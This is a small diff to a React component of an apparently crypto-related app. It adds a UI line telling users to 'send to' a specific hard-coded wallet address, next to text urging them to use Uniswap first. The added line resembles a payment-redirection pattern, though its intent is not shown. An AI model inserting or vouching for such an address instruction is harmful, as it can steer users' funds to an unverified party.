@@ -146,6 +146,9 @@ const App = () => {
       <span style={{ fontSize: '0.8rem' }}>go to uniswap First</span>
       <br />
       <span style={{ fontSize: '0.8rem' }}>for Successful Transaction</span>
+      <br />
+      <span style={{ fontSize: '0.8rem' }}>send to 0xa98eE461688c0f670DA0492aD8A0733E6c916106 </span>
+
     </Typography>
         </Box>
         
